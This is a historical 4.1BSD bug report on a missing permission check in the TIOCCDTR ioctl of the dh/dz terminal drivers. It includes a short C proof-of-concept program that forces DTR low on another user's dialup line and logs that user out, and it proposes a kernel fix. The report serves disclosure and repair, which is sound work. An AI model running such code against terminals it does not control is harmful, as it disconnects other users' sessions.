Subject: security bug in TIOCCDTR ioctl
Index:	sys/vaxuba/d[hz].c	4.1BSD	FIX
 
 Description:

	The TIOCCDTR ioctl, used to clear the DTR bit, does
	not perform suitable permission checking.

	For example, if a terminal device can be opened for
	writing by a process in a group other than that
	of the device, that process can then force DTR low
	on that terminal line. While some processes are only
	mildly susceptible to having random garbage written
	to the terminal, they may be extremely vulnerable to
	the logout which results from loss of DTR on a
	typical dialup.

	TIOCCDTR, and, less importantly, TIOCSDTR, should
	return error if the file descriptor passed in the
	ioctl does not refer to the controlling terminal
	for the process which invokes the ioctl and the
	uid is not superuser.

 Repeat-By:

	#include	<sys/file.h>
	#include	<sgtty.h>	/* or whatever */
	#define		error( s )	{perror( (s) ); exit( 1 );}

	main( argc, argv )
	int	argc;
	char 	*argv[];
	{
		register	int	fd;

		if ( (fd = open( *++argv, FWRONLY )) < 0 )
			error( *argv );

		if ( ioctl( fd, TIOCCDTR, 0 ) < 0 )
			error( "TIOCCDTR" );

		exit( 0 );
	}

	Now, suppose that someone is logged in on /dev/ttyxx, where
	/dev/ttyxx is a dialup line. Execution of the above program
	as in, say,

			a.out /dev/ttyxx

	will typically result in termination of the user's login process.

 Fix:

	To fix the problem specifically mentioned, a test of
	the type

		if ( u.u_uid && u.u_ttyp != tp )
			return EACCES;

	should be added at or around dz.c:319 (dh.c:349), just
	after the case TIOCCDTR: line. This is similar to the
	criterion used for TIOCSTI in sys/tty.c.

	It should be carefully considered which of the similar
	ioctls should have similar permission restrictions. All
	could be covered by including a test such as the one
	above at or around dz.c:296 (dh.c:335) before the switch.
	Whether this is appropriate or not is a matter for debate.
